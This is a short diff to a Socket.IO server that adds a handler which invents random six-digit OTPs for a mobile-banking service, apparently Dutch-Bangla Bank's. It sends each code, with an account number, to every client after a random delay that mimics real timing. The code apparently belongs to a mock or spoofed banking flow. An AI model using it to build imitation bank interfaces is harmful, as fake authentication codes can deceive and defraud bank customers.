@@ -82,6 +82,14 @@ io.on("connection", (socket: Socket) => {
     io.emit("captcha-received", data);
   });
 
+  socket.on("dbblmobilebanking-auto-otp", (data) => {
+    const otp = Math.floor(100000 + Math.random() * 900000).toString();
+    const randomDelay = Math.floor(Math.random() * 4000) + 1000;
+    setTimeout(() => {
+      io.emit("dbblmobilebanking-otp", { otp, acc: data?.acc });
+    }, randomDelay);
+  });
+
   socket.on("disconnect", () => {
     for (const userId in onlineUsers) {
       if (onlineUsers[userId].socketId === socket.id) {
